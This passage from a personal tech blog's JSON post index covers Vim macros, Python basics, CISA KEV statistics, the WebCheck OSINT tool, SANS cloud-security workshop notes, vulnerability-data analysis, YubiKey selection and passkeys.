compare it with the use of try-finally method to ensure code cleanup.\n","date":"2024-03-15 06:43","externalUrl":null,"permalink":"/posts/python_with_try_finally/","section":"posts","summary":"Using Context Manager as an essential coding practice in Python.","title":"Python with Context Manager","type":"posts"},{"content":"","date":"2024-03-08 08:16","externalUrl":null,"permalink":"/tags/macro/","section":"tags","summary":"","title":"macro","type":"tags"},{"content":" Macro is like a magic. All the while, I\u0026rsquo;m a fan of Vim editor. In fact, this whole blog is edited with Vim editor (manually).\nMacros in VIM # Today I learn my first macro in Vim editor.\nHere are the steps to create a macro, to repeat on editing the line, and apply it.\nCreating Macro # To record a macro (from command mode):\nPress q to start a macro.\nPress h to register for macro.\nGoto insert mode and edit a line as usual.\n(Goto position of the first line) press i to switch to insert mode press \u0026quot; for open quote press ESC to switch back to command mode press a to append to the end of line position and switch to insert mode press \u0026quot; and , for closing quote with comma press ESC to switch back to command mode pressENTER to goto next line (at first position) Press q to stop the macro.\nApply The Macro # To simply apply the recorded macro to a line, press @h.\nTo apply the macro to multiple lines, press 5@h.\nDemo (YT Shorts) # Thank you typecraft for the excellent tip!\n","date":"2024-03-08 08:16","externalUrl":null,"permalink":"/posts/vim_macros/","section":"posts","summary":"Repeating commands in vim editor with macro.","title":"Macro in VIM","type":"posts"},{"content":"","date":"2024-03-08 08:16","externalUrl":null,"permalink":"/tags/vim/","section":"tags","summary":"","title":"vim","type":"tags"},{"content":" Learning these command lines, you can create some automation that can do regular security checks. Multicloud Cmdline # Brandon Evans (from SANS) has created a multicloud command line interface cheat sheet. It helps to perform common cloud tasks including connecting to the cloud, filtering, querying data, SSH to virtual machine and managing storage.\nThe cheat sheet covers different commands for AWS, Azure and GCP. The demo below includes how to list S3 buckets, download/upload files, and perform encryption/decryption using AWS KMS.\nSee the links below to download this handy cheat sheet.\nDemo # Let\u0026rsquo;s tune into the demo at YouTube with Brandon Evans.\nLinks # Download Multicloud CLI Cheat Sheet. Download JSON Quick Start Guide. Download Secure Service Configuration Poster. SEC510: Cloud Security Controls and Mitigations ","date":"2024-03-05 14:34","externalUrl":null,"permalink":"/posts/multicloud_cli_cheatsheet/","section":"posts","summary":"Multicloud Command Line Cheat Sheet Resource Demo.","title":"Multicloud Cmdline Cheat Sheet","type":"posts"},{"content":"","date":"2024-03-05 14:34","externalUrl":null,"permalink":"/tags/sans/","section":"tags","summary":"","title":"sans","type":"tags"},{"content":" CISA KEV has been released 28 months. Today, there are total of 1083 CVE been added to CISA KEV catalog.\nCISA Catalog of Known Exploited Vulnerabilities [ 2024.02.29/1083 ]\nUpdates # As of today, there are total of 1078 CVE have overdue, and another 5 will due in March 2024.\nHighlights (within CISA KEV catalog):\nThe top-5 vendors with highest number of vulnerabilities remain the same (total 171 vendors). The top-5 vendors hold 543 (around 50%) of all the 1083 CVE. The top-5 vulnerable products remain the same (total 456 products). There are 234 (or 21%) CVE found at the top-5 vulnerable products. The mean value increases to 90.25 (was 87.75). The top-5 months where distribution of KEV is higher than mean remain the same (Mar, Apr, May Jun, Nov). Current State # Microsoft Apple Cisco Adobe Google others 280 73 69 67 54 540 Windows Multiple Products (Apple) Internet Explorer Flash Player Chromium V8 others 110 36 31 29 28 849 mean_val=90.25\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 28 32 126 157 233 146 58 46 47 45 125 40 ","date":"2024-03-01 17:58","externalUrl":null,"permalink":"/posts/cisa_kev_28m/","section":"posts","summary":"Analysis of CISA KEV catalog.","title":"State of KEV After 28 months","type":"posts"},{"content":"","date":"2024-02-26 14:46","externalUrl":null,"permalink":"/tags/osint/","section":"tags","summary":"","title":"osint","type":"tags"},{"content":" WebCheck is completely free. There is no signup, tracking, logging, or ads. I learn about OSINT Day one year ago. Thus, I\u0026rsquo;m sharing another handy OSINT for any website today.\nWebCheck # WebCheck is another handy OSINT that I encounter recently. It offers open-source intelligence and allows understanding of a website\u0026rsquo;s infrastructure and security posture.\nUnlike similar tools, WebCheck is free with no requirement for signup or ads. It even offer an online version for quick test.\nThe dashboard shows a number of information including:\nIP info SSL chain DNS records cookies and headers domain info server location open ports and traceroute info etc Deployment # There are a number of options to deploy WebCheck.\nNetlify Vercel Docker Source For the details, please refer to the WebCheck at GitHub. See the link below.\nMy Test # First, I like the interface. It is simple and straight forward.\nSecond, the tool is fast. In my test, it completes 25 jobs within 6400 ms.\nThird, I found that the \u0026ldquo;Show Details\u0026rdquo; is handy and provide me an insight into the inner-workings of what were found. It also provides the option to view and download the raw data (JSON).\nBelow is the screenshot taken from WebCheck. Last, as the API documentation is not yet evailable, once it is available, I\u0026rsquo;ll definitely explore more into the it.\nGreat job and thanks to Alicia Sykes!!\nUpdate # Today (Mar 3), I come across this YouTube video that talks about WebCheck, Unleash Your Cyber Investigation Powers: Master Web Check\u0026rsquo;s OSINT Capabilities!.\nWatched: Mar 3, 2024, 14:44\nLinks # Online WebCheck. WebCheck on GitHub. OSINT Day. ","date":"2024-02-26 14:46","externalUrl":null,"permalink":"/posts/webcheck/","section":"posts","summary":"WebCheck: Open-source intelligence for any website.","title":"OSINT Tool: WebCheck","type":"posts"},{"content":" Navigate DevSecOps and automation with all new cloud native security content and labs via browser-based SANS Cloud Flight Simulator. SEC540 # SANS SEC540 provides security professionals with the knowledge to automate guardrails and security policies in their DevOps pipelines, cloud infrastructure, container orchestrators, and microservice environments. The aims is to help everyone:\nTo embrace the DevOps culture. Be equipped with cutting-edge tools and concepts to combat modern threats in Cloud and DevOps security. Cloud Flight Simulator # Cloud Flight Simulator, is a new set of tools introduced in SEC540 course. Student no longer need to run a VMware virtual machine locally or bring their own AWS /Azure cloud accounts.\nExplore the rest of the Cloud Flight Simulator Series:\nPart 1 GitLab CI, Workflows, and Secrets Part 2 Protecting Kubernetes Clusters with Admission Part 3 Safeguarding the Software Supply Chain Part 4 Least Privileged Pods with Kubernetes Workloads As a student of SEC540, I love the CFS very much. It creates a more immersive, clean, and realistic lab environment for learning.\nBelow are some of my notes after finishing the workshops.\nPart 1 # Date: Thu Jan 04 2024 (updated on Feb 4, 2024)\nIn part 1, Eric has shared the topic on Continuous Integration (CI) with GitLab. He also demo the JWT Integration in GitLab CI workflow with OpenID Connect (OIDC).\nUnderstand and compare the different CI tools: cloud-based, on-prem, on-prem (opensource), cloud native. GitLab\u0026rsquo;s OpenID Connect (OIDC). Part 2 # Date: Thu Jan 18 2024 (updated on Feb 14, 2024)\nKubernetes admission controllers play a critical role in enhancing the security of a Kubernetes cluster. They act as gatekeepers, intercepting requests to the Kubernetes API server before requests are processed and stored by the cluster.\nIn part 2, Ben talks about how to secure a Kubernetes Clousters with Admission controllers. In his talk, he covers:\nK8s overview K8s cluster components Admission Control Data Flow including built-in, and dynamic admission controllers. Open Policy Agent Part 3 # Date: Thu Feb 01 2024 (updated on Feb 21, 2024)\nEnrich software development practices provides better assurance regarding the software development and creation of artifacts. Popular techniques inlcude: Artifact Provenance, Signatures, and Software Bill of Materials (SBOM).\nOther interesting topics in Software Supply Chain Security Hierarchy include: the policy and insight, the aggregation and synthesis (GUAC), the software attestations (SLSA), and the trust foundation (SigStore).\nIn part 3 of CFS sharing, safeguarding the software supply chain, Jon talks about:\nThe Supply Chain Security eco-system in modern software development. The software Supply Chain Security issues: Source Threats: unauthorized change, compromise source repo, modified source. Depdendency Threats: compromised depdencencies. Build Threats: compromise build process, modified package, compromise package. What is Software Provenance (DSSE envelope) ? Supply-chain Levels for Software Artifacts (SLSA) and SBOM. Demo 3 SBOM formats: cyclonedx, SPFX (ISO/Linux foundation), SYFT. The OpenVEX (Vulnerability Exploitability Exchange) Vs CycloneDX. The Day-2 challenges and techniques in Supply Chain Security OSCAL - Open Security Controls Assessment Language (NIST project) Kubernetes Governance, Risk and Compliance Part 4 # Date: Thu Feb 15 2024 (updated on Feb 26, 2024)\nThis is about leveraging least privileged pod with Kubernetes Workloads.\nRather than issuing long-lived credentials to individual pods or inheriting excessive permissions from the node, Kubernetes service accounts can use an internal OpenID Connect (OIDC) provider to obtain a signed identity token (JWT). Then, cloud administrators can configure their identity services (IAM, Entra ID) to trust the Kubernetes cluster\u0026rsquo;s OpenID Connect provider and grant the service account to obtain temporary, least privilege credentials.\nIn the final part of CFS, Eric will show how to enable workload identity for AWS Elastic Kubernetes Service (EKS) and Azure Kubernetes Service (AKS).\nKubernetes Managed Services Kubernetes Workload Identity Options Anti-pattern: Long-lived credentials, and inherit node permissions Bash history, config files, source codes, version controls, k8s secrets, env var. access to IMDS for secrets keys. Kubernetest Workload Identity (OIDC) manage default permissions (minimal) specific service account role bindings. (EKS) using IAM Roles for Service Accounts (IRSA) EKS pod identity (agent) specific to AWS only no config change at K8s Links # SANS SEC540: Cloud Security and DevSecOps Automation\nWhat is the SANS Cloud Flight Simulator?\nCloud Flight Simulator part 1 Cloud Flight Simulator part 2 Cloud Flight Simulator part 3 Cloud Flight Simulator part 4 Software Supply Chain resources:\nKubernetest Governance, Risk, and Compliance Software Supply Chain Best Practices by CNCF The Secure Software Factory by CNCF Kubernetes Workload Identity presentation/workshops\nAWS Identity Provider, MS Workload Identity Federation, Google Workload Identity Federation. Audit scripts:\nJWT Decode Shortcuts az-aks-audit-workload-identity.sh aws-eks-irsa-pods-audit.sh aws-eks-audit-pod-identity-pods.sh ","date":"2024-02-21 18:17","externalUrl":null,"permalink":"/posts/cloud_flight_simulator/","section":"posts","summary":"Cloud Flight Simulator workshops from SANS.","title":"Cloud Flight Simulator","type":"posts"},{"content":"","date":"2024-02-21 18:17","externalUrl":null,"permalink":"/tags/devsecops/","section":"tags","summary":"","title":"devsecops","type":"tags"},{"content":"","date":"2024-02-21 18:17","externalUrl":null,"permalink":"/tags/workshop/","section":"tags","summary":"","title":"workshop","type":"tags"},{"content":" Comprehension is a concise and powerful way to create lists or dictionaries in Python.\nIn short, it helps to combine multiple lines of code into one.\nList Comprehension # It allows to create new list by applying an expression to each item in an existing iterable, such as list, tuple, or range and optionally filtering the items based on a condition.\n# Traditional approach squares = [] for num in range (1,11): squares.append(num*num) With list comprehension, we can achieve the same result in just one line of code below.\n# List Comprehension squares = [ num*num for num in range(1,11) ] List comprehsnsion contains 3 main componenets.\n[ expression for item in iterable if condition ]\nExpression This is the operation to preform on each item in the iterable. It could be anything from simple arithmetric operation to a function call. Iterable This is the collection of items over to iterate. It can be a list, tuple, range or any other iterable object. Condition This is for filtering the items in the iterable based on a certain condition. Optional. Examples # # Creating a list of squares of even numbers from 1 to 10 squares_evens = [ num**2 for num in range(1,11) if num%2 == 0 ] # Replaces by \u0026#39;even\u0026#39; or \u0026#39;odd\u0026#39; results = [ \u0026#39;even\u0026#39; if num%2 == 0 else \u0026#39;odd\u0026#39; for num in range(1,11) ] Dictionary Comprehension # Like list comprehension, Python allows dictionary comprehensions. We can create dictionaries using simple expressions. A dictionary comprehension takes the form:\n{ key: value for (key,value) in iterable }\n# Create dict using list comprehension myDict = { x: x**2 for x in [1,2,3,4,5] } # output: {1: 1, 2: 4, 3: 9, 4: 16, 5: 25} Examples # # Create a dict with if condition statement newdict = {x: x**3 for x in range(10) if x**3 % 4 == 0} # output: {0: 0, 2: 8, 4: 64, 6: 216, 8: 512} # Create a nested dictionary s = \u0026#34;ABA\u0026#34; d = { x: {y: x + y for y in s } for x in s } # output: {\u0026#39;A\u0026#39;: {\u0026#39;A\u0026#39;: \u0026#39;AA\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;AB\u0026#39;}, \u0026#39;B\u0026#39;: {\u0026#39;A\u0026#39;: \u0026#39;BA\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;BB\u0026#39;}} ","date":"2024-02-16 12:12","externalUrl":null,"permalink":"/posts/python_comprehension/","section":"posts","summary":"List and Dict comprehension in Python.","title":"Comprehension in Python","type":"posts"},{"content":"","date":"2024-02-06 20:07","externalUrl":null,"permalink":"/tags/debug/","section":"tags","summary":"","title":"debug","type":"tags"},{"content":" Debugging is twice as hard as writing the code in the first place.\nTherefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it.\n","date":"2024-02-06 20:07","externalUrl":null,"permalink":"/posts/debugging/","section":"posts","summary":"Debugging is twice as hard as writing the code.","title":"Debugging","type":"posts"},{"content":" Here\u0026rsquo;s the differnce between a module, a package and library in Python. Module A single file that contain Python codes, functions, classes, etc. import my_module Package A collection of modules stored in a directory. Every package contains a __init__.py file. Library Refers to a collection of modules and packages. Links # Python Package ","date":"2024-01-27 18:08","externalUrl":null,"permalink":"/posts/module_package_library_python/","section":"posts","summary":"Quick differences among a module, a package, and libary in Python.","title":"Module vs Package vs Library","type":"posts"},{"content":"","date":"2024-01-23 16:14","externalUrl":null,"permalink":"/tags/analytics/","section":"tags","summary":"","title":"analytics","type":"tags"},{"content":"","date":"2024-01-23 16:14","externalUrl":null,"permalink":"/tags/data/","section":"tags","summary":"","title":"data","type":"tags"},{"content":" Demonstrate the methodolgy how data analytic can be used in Vulnerability Management by producing the story points about the effectiveness of current remediation work, and is it efficient in addressing the new vulnerability released every month. Today, I\u0026rsquo;ll show 3 basic data analytic that we can used in analyzing our vulnerability data. And how can the result can be turned into a story for Vulnerability Management.\nContext # We start with a scenario where below is what we have in our vulnerability database.\nHostname Vuln_Count 1 \u0026ldquo;a\u0026rdquo; 3 2 \u0026ldquo;b\u0026rdquo; 50 3 \u0026ldquo;c\u0026rdquo; 33 4 \u0026ldquo;d\u0026rdquo; 80 5 \u0026ldquo;e\u0026rdquo; 33 6 \u0026ldquo;f\u0026rdquo; 3 7 \u0026ldquo;g\u0026rdquo; 33 Questions:\nWhat kind of analysis can be (easily) performed based on the data above? Does the remediation work faster than the new vulnerability released? How can we tell a story based on the output (analyzed result)? Data Analysis # We\u0026rsquo;ll perform 3 types of analysis: mean, median and mode.\nAs a start, we can structure the data in Python code below.\nhost_vuln = { \u0026#34;a\u0026#34;: 3, \u0026#34;b\u0026#34;: 50, \u0026#34;c\u0026#34;: 33, \u0026#34;d\u0026#34;: 80, \u0026#34;e\u0026#34;: 33, \u0026#34;f\u0026#34;: 3, \u0026#34;g\u0026#34;: 33 } Then, we need to understand 3 terms below.\nMean The average of all numbers. (aka arithmetric mean) Median The middle number in a group of numbers. Mode The number that occurs often within a set of numbers. Code (quick) # host_vuln = { \u0026#34;a\u0026#34;: 3, \u0026#34;b\u0026#34;: 50, \u0026#34;c\u0026#34;: 33, \u0026#34;d\u0026#34;: 80, \u0026#34;e\u0026#34;: 33, \u0026#34;f\u0026#34;: 3, \u0026#34;g\u0026#34;: 33 } vulns = list(host_vuln.values()) total = sum(vulns) hosts = len(host_vuln) get_mean = total / hosts get_mode = 0 vulns.sort() if hosts % 2 == 0: median1 = vulns[hosts//2] median2 = vulns[hosts//2 -1] g_median = ( median1 + median2 ) / 2 else: g_median = vulns[hosts//2] from collections import Counter data = Counter(vulns) get_mode = dict(data) mode = [ k for k,v in get_mode.items() if v == max(list(data.values()))] if len(mode) == hosts: get_mode = \u0026#39;No mode found.\u0026#39; else: get_mode = \u0026#39;,\u0026#39;.join(map(str,mode)) hostvuln2 = dict(sorted(host_vuln.items(), key=lambda x:x[1])) print(f\u0026#39;\u0026#39;) print(f\u0026#39;Host_count : {hosts}\u0026#39;) print(f\u0026#39;Total_vuln : {total}\u0026#39;) print(f\u0026#39;Mean : {get_mean}\u0026#39;) print(f\u0026#39;Median : {g_median}\u0026#39;) print(f\u0026#39;Mode : {get_mode}\u0026#39;) print(f\u0026#39;\u0026#39;) print(f\u0026#39;{host_vuln}\u0026#39;) print(f\u0026#39;{hostvuln2}\u0026#39;) And here is the output:\nHost_count : 7 Total_vuln : 235 Mean : 33.57142857142857 Median : 33 Mode : 33 {\u0026#39;a\u0026#39;: 3, \u0026#39;b\u0026#39;: 50, \u0026#39;c\u0026#39;: 33, \u0026#39;d\u0026#39;: 80, \u0026#39;e\u0026#39;: 33, \u0026#39;f\u0026#39;: 3, \u0026#39;g\u0026#39;: 33} {\u0026#39;a\u0026#39;: 3, \u0026#39;f\u0026#39;: 3, \u0026#39;c\u0026#39;: 33, \u0026#39;e\u0026#39;: 33, \u0026#39;g\u0026#39;: 33, \u0026#39;b\u0026#39;: 50, \u0026#39;d\u0026#39;: 80} Analysis # Now, we have output:\nmean is 33.57 median is 33 mode is 33 First, compare the 3 outpus.\nIn this scenario, all the 3 outputs are either the same or very close. This indicates that the data is symmetrically distributed. And this mean the collected data is good.\nIf you were to draw a line chart based on a symmtrical distribution, it should look like a centrally placed \u0026ldquo;bell curve\u0026rdquo;.\nIn the case of all the 3 outputs are significantly different, it indicates that the data may not have a symmetric distribution.\nThis also signals that the data has certain chracteristics, such as skewness, or the present of outliers, or a multimodal distribution.\nSkewed Distribution The mean value tend to be pulled in the direction of the skewness. Refer to the median value (for measure of central tendency), as itis less affected by extreme values. Outliers mean value is influenced heavily by some extreme values. The median and mode values are more robust here. Multimodal Distribution Sometimes, multiple modes (more than one peak) may exist. The mean and median values might provide better indication. Nevertheless, the analysis should allow us to select a more robust value (from mean/median/mode) as a reference. (In this case, we select the mean value or 33.57 as the benchmark for this month)\nEstablish Story # And we can start to dig out the story points before making the conclusion.\nStory_1 # Current Performance. This should tell the overall performance of the remediation by showing the following table. Benchmark/(33) Host_Count Percentage \u0026lt;= 33 5 ~71% \u0026gt; 33 2 ~29% (Story points) Based on our vulnerability data:\n71% of the hosts has met our minimum benchmark. Hosts are being patched and covered symmetrically. All the 3 outputs are alighed and found no host with extreme vulnerability count or not being patched. Story_2 # Regular Comparison. Every time we collect the vulnerability data, we can established a benchmark. And this benchmark value is dynamic. This means we may have different values each time we collect them.\nIn this scenario, we can start builing a regular table to show the difference. See below.\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec Total_Vuln 128 138 320 227 433 246 185 189 187 254 245 235 Benchmark 44 38 42 57 53 46 45 49 47 54 45 33 Hosts (%) 3 3 3 2 3 3 4 4 4 4 4 5 (71%) (Story points) Based on our vulnerability data, we see Improvement in our KPI:\nThe latest vulnerability benchmark is generally lower than the past results. This indicates that the remediation is generally faster than the new vulnerability released. Vulnerability benchmarks are consistent based on the past 3 months results. This indicates that the remediation work is consistent without any exception. Highest number of hosts are meeting the minimum requirement (comparing to past results). The total \u0026ldquo;vulnerabilities count\u0026rdquo; is just a metric, not a KPI. Because the number is greatly depending by the number of vulnerabilities released by vendors at that month.\nSee the link, Vulneability Data Analytics, below to tell the differences between metrics and KPI.\nStory_3 # Deep Dive Analysis. We can address the highest risk hosts by dive into the analysis of vulnerability data by different teams/hosts. For example:\nRate the performance of different remediation teams. Provide the top-X hosts with most vulnerabilities. Provide the top-X vulnerabilities. Performance Teams/Hosts High \u0026ldquo;a\u0026rdquo;, \u0026ldquo;f\u0026rdquo; Medium \u0026ldquo;c\u0026rdquo;, \u0026ldquo;e\u0026rdquo;, \u0026ldquo;g\u0026rdquo; Low \u0026ldquo;b\u0026rdquo;, \u0026ldquo;d\u0026rdquo; (Story points) Based on the performance, we will perform deep dive analysis into:\nThe hosts \u0026ldquo;b\u0026rdquo; and \u0026ldquo;d\u0026rdquo; on why they have the highest vulnerability count. The patching methodology used by team \u0026ldquo;b\u0026rdquo; and \u0026ldquo;d\u0026rdquo;, and provide improvement. The CVE with highest vulnerability instances. Further Deep Dive Analysis Focus on different business units (teams), applications, OS platforms, etc. Focus on hosts with highest risk score (or vulnerability count). Focus on top-X highest severity vulnerability. Restrict the dataset to Critical/High severity vulnerability only. Summary # The full story can be summerized as :\n71% of the hosts has met our minimum benchmark. Hosts are being patched and covered symmetrically. The remediation work has efficiently to address new vulnerability released. Remediation is consistent based on the lastest 3-month results. Highest number of hosts are meeting the minimum requirements. Links # Vulnerability Data Analytics ","date":"2024-01-23 16:14","externalUrl":null,"permalink":"/posts/vuln_data_analysis/","section":"posts","summary":"How can you tell if your remediation work effectively? Is it efficient in addressing new vulnerability released every month?","title":"Data Analysis Story for VM","type":"posts"},{"content":" Benchmarking is a broader concept that involves assessing the overall performance of a system or operations by repeating it multiple times, while measuring the time taken is just a specific aspect of benchmarking that focuses on evaluating the execution time of specific code once. Measurement # In Python, measuring time taken involves specifically tracking the execution time of a particular piece of code or function. It is used to analyze and measure the amount of time taken to complete a specific code segments.\nTiming code execution can be done using various techniques, such as the time module, and the timeit module, or more sophisticated tools like cProfile module.\nThis process focuses on measuring the time it takes for a specific piece of code to run.\nBenchmark # Benchmarking involves evaluating the performance of a piece of code and comparing it to a reference point or a standard. It is used to assess the overall performance of a specific operation and compare it against an implementation or by repeating the operation multiple times.\nBenchmarking often involves running a set of standardized tests and collecting metrics (execution time, memory usage, other performance indicators), and repeating it many times.\nMeasuring Code # Here, I show a few ways how to measure the execution time taken for a Python script.\nBelow is the most common way to demonstration the use of time module to measure the execution time.\nimport time start: float = time.perf_counter() ... end: float = time.perf_counter() print(f\u0026#39;Completed within [{end-start:.2f} sec].\u0026#39;) However, I\u0026rsquo;m prefer to the use of timeit module most of the time.\nfrom timeit import default_timer as timer start: float = timer() ... end: float = timer() print(f\u0026#39;Completed within [{end-start:.2f} sec].\u0026#39;) Difference between time.perf_counter() and timeit.default_timer(). Using timeit() will temporary turns off garbage collection during timeing, and it makes independent timings more comparable. Also, timeit.default_timer() will adstract away platform-specific details and chooses an appropriate timer.\nBenchmarking Code # Here, I will demonstrate how I use the repeat function to benchmark a specific piece of code, by repeating it 5 times with 10000 executions per loop, and get the min() (best case out of 5).\nfrom timeit import repeat, default_timer as timer # Repeat the measurement 5 times with 10000 executions per loop #result: float = min(repeat(stmt, setup, timer=timer, repeat=5, number=10_000)) new_list: str = \u0026#34;\u0026#34;\u0026#34;my_list: list[int] = [i for i in range(10)]\u0026#34;\u0026#34;\u0026#34; result: float = min(repeat(new_list, timer=timer, repeat=5, number=10_000)) ### Best time : 0.001513827999588102 sec print(f\u0026#39;Best time : {result} sec\u0026#39;) Links # Python Benchmarking Best Practices ","date":"2024-01-17 13:59","externalUrl":null,"permalink":"/posts/python_benchmark_measurement/","section":"posts","summary":"Different ways to do benchmark and measurement with Python code.","title":"Benchmark and Measurement","type":"posts"},{"content":"","date":"2024-01-09 06:00","externalUrl":null,"permalink":"/tags/2fa/","section":"tags","summary":"","title":"2fa","type":"tags"},{"content":" I bought my first YubiKey last year, as a gift for myself from Cyber Monday sales. Here\u0026rsquo;s why I invest in hardware keys and the 3 main consideration when I choose my hardware keys.\nPurpose # We all know the feeling: forgotten logins, reset emails flooding our inbox. Our email account, is the master key to our digital lives.\nThus, the essential steps to secure my email account is to give it 2FA or MFA, and don\u0026rsquo;t rely on password.\nEnter the hardware key, as my email\u0026rsquo;s new bodyguard. This tiny tech titan taps or touches its way to secure logins, leaving hackers scratching their heads (and laptops).\nIt\u0026rsquo;s not just about paranoia, it\u0026rsquo;s about feeling smugly secure. Imagine gliding through online life without password hassles. ⛵\nSo ditch the password drama and grab yourself a hardware key. Plus, it\u0026rsquo;s a sneaky step towards a passwordless future (no more remembering \u0026ldquo;ilovepuppies123!\u0026rdquo;).\nUpgrade your email security – and your peace of mind – with a hardware key. Trust me, your future self will thank you.\nConsiderations # 1. Brand and Vendor - Must be reputable - Must be FIDO Alliance compatible 2. Protocols supported - Must be FIDO2 (WebAuth) and U2F - Support OTP (optional) 3. Compatibility - Must support USB-C and NFC - Support USB-A (optional) I need NFC support because it allows me to use it with my mobile phone.\nI prefer USB-C to USB-A because it is compatible with both my laptop and phone.\nBackup # I also buy two YubiKeys, so I have a backup in case I lose one.\nLinks # My First YubiKey ","date":"2024-01-09 06:00","externalUrl":null,"permalink":"/posts/hardware_key/","section":"posts","summary":"Show you how I choose my first YubiKey.","title":"Choosing Hardware Key for Myself","type":"posts"},{"content":"","date":"2024-01-09 06:00","externalUrl":null,"permalink":"/tags/hardware/","section":"tags","summary":"","title":"hardware","type":"tags"},{"content":"","date":"2024-01-09 06:00","externalUrl":null,"permalink":"/tags/mfa/","section":"tags","summary":"","title":"mfa","type":"tags"},{"content":"","date":"2024-01-09 06:00","externalUrl":null,"permalink":"/tags/yubikey/","section":"tags","summary":"","title":"yubikey","type":"tags"},{"content":"","date":"2024-01-04 17:58","externalUrl":null,"permalink":"/tags/passkeys/","section":"tags","summary":"","title":"passkeys","type":"tags"},{"content":"","date":"2024-01-04 17:58","externalUrl":null,"permalink":"/series/passkeys/","section":"series","summary":"","title":"Passkeys","type":"series"},{"content":" TL;DR, passkeys replaces passwords. Passkeys is probably the next generation of account authentication and security protection. Here, I\u0026rsquo;m starting a series of blog post on passkeys and some of the essential practices.\nLet\u0026rsquo;s begin by understanding what\u0026rsquo;s wrong with password authentication.\nWhat\u0026rsquo;s Wrong with Password? # Everyone knows that password is used as solution to secure our assets/devices. There are used to be a lot of devices has no password protection in the past.\nBut, in recent years, a solution has now become a problem itself. This is simply because of password policy that we created.\nMust contain combination of all below:\nAt least an Uppercase and a lowercase characters. At least a numeric digits. At least a special characters. Minimum length of 8 or more. And thanks to complexity of password policy, some users start to wrote it down on sticky notes and leave it on the table. And this defeats the purpose of having password to protect our accounts.\nA solution has now become a problem. And I think it should go EOL.\nPasskeys Auth # Passkeys Auth is a new passwordless authentication standard that is being developed by the World Wide Web Consortium (W3C) and the FIDO Alliance. Passkeys are designed to be more secure and convenient than traditional passwords, and they are expected to eventually replace passwords altogether.\nPasskeys are more secure than passwords because they are not stored on servers. This means that even if a website or application is hacked, passkeys cannot be stolen. i Passkeys are also more convenient than passwords because users do not need to remember or manage multiple passwords.\nThe best part is, we can eliminate the password policy.\nPasskeys are still under development, but they are supported by a growing number of websites and applications. Google, Apple, and Microsoft have all announced plans to support passkeys in their browsers and operating systems.\nTypes of Passkeys # There are 2 types of passkeys, and both comes with pro and con.\nBoth cloud-based and hardware-bounded passkeys are passwordless authentication methods offering better security than traditional passwords. However, they differ in their storage, security level, and use cases.\nCloud-based Hardware-bounded Storage cloud-based vault physical device (security keys or smartphone) Access Highly accessible (Internet) Require physical possession of the device Authentication + master password + with biometric + physical presence of the device + biometric authentication Pros - Convenient access - Easy to manage and backup - Can be used with multiple devices - More secure due to physical requirement - Resistant to phishing attacks - No need to remember passwords Cons - Less secure if master password is compromised - Vulnerable to cloud-based attacks - May require internet connectivity for access - - Less convenient if device is lost or forgotten - May not be compatible with all devices or services Use cases - Good for single platform syncing like Google or Apple. - Personal online accounts - Low-risk corporate apps - Good for lots of different platforms - High-security corporate applications - Financial accounts Don\u0026rsquo;t mix up between Password+MFA with Hardware-bounded Passkey solution. They are not the same.\nHow It Work? # TL;DR, it just work like your SSH key authentication.\nPasskeys are based on public key cryptography and biometric authentication. When a user creates a passkey for a website or application, their device generates a unique public/private key pair. The public key is stored on the website or application, and the private key is stored on the user\u0026rsquo;s device.\nTo authenticate with a passkey, the user simply needs to unlock their device and select the passkey for the website or application they want to sign in to. The user\u0026rsquo;s device will then generate a challenge and send it to the website or application. The website or application will then verify the challenge using the user\u0026rsquo;s public key.\nIn the future, I will try to demonstrate how it can work in reality, and more essential practices on using different types of passkeys. I\u0026rsquo;ll also share some of the challenges to use passkeys in the corporate environment.\n","date":"2024-01-04 17:58","externalUrl":null,"permalink":"/posts/passkeys/","section":"posts","summary":"There is nothing to be phished if you don\u0026rsquo;t use password at all.","title":"Passkeys 101","type":"posts"},{"content":"","date":"2024-01-04 17:58","externalUrl":null,"permalink":"/tags/passwordless/","section":"tags","summary":"","title":"passwordless","type":"tags"},{"content":" There are total of 1053 CVE been added to CISA KEV catalog by end of 2023.\nCISA Catalog of Known Exploited Vulnerabilities [ 2023.12.21/1053 ]\nUpdates # As of today, there are total of 1051 CVE have overdue, and another 2 will due in Jan 2024.\nHighlights:\nThe top-5 vendors with highest number of vulnerabilities remain the same (total 169 vendors). The top-5 vendors hold 523 (around 50%) of all the 1053 CVE within CISA KEV catalog. The top-5 vulnerable products remain the same (total 420 products). There are 226 (or 21%) CVE found at the top-5 vulnerable products. The mean value increases to 87.75 (was 86.916). The top-5 months where distribution of KEV is higher than mean remain the same (Mar, Apr, May Jun, Nov). Current State # Microsoft Apple Cisco Adobe Google others 275 70 67 65 51 525 Windows Multiple Products (Apple) Internet Explorer Flash Player Chromium V8 Engine others 108 33 31 29 25 827 mean_val=87.75\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 16 20 120 157 233 146 58 46 47 45 125 40 ","date":"2024-01-01 01:37","externalUrl":null,"permalink":"/posts/cisa_kev_26m/","section":"posts","summary":"Summarize CISA KEV cataglog by end of 2023.","title":"State of KEV After 26 months","type":"posts"},{"content":" Let\u0026rsquo;s dive into a Python fundamental concept called __init__.py. Fundamental Concept # Using __init__.py, allows you to organiza your code into modular chunks, making it easier to manage and reuse.\nThis is like a blueprint for your package, where you can define common functions, variables or even import other modules.\nHow It Works # Creating my_package:\n$ mkdir my_package $ cd my_package $ touch __init__.py $ touch testing.py Creating the function:\n# testing.py def greeting(): print(f\u0026#39;Hello World\u0026#39;) Now, let\u0026rsquo;s import the package.\n$ cd .. $ touch main_test.py # main_test.py from my_package import testing testing.greeting() Should get the output \u0026lsquo;Hello World\u0026rsquo;.\nThis shows that the __init__.py makes the testing module accessible from within the my_package namespace.\nConclusion # __init__.py is a fundamental building block for creating structured and organized Python packages.\nIt helps to manage, organize and maintain your Python package code in much easier format. By providing a foundation for structured code, it facilitates the resue of components within the package.\nIt can enhances the clarity of the package structure, and mkeing it easier to share with others.\nWe can combine __init__.py and __main__.py, to allow us execute Python package as project (like python my_package). See the Python Project post.\nPython Project 2023-08-25 01:30\u0026middot;221 words\u0026middot;2 mins Posts Essential 101 python py-venv Elegant way to execute Python project. Links # Python Project [MySeq] ","date":"2023-12-26 09:55","externalUrl":null,"permalink":"/posts/python_package/","section":"posts","summary":"Fundamental building block for Python package.","title":"Python Package","type":"posts"},{"content":" Build your first Container Image, and 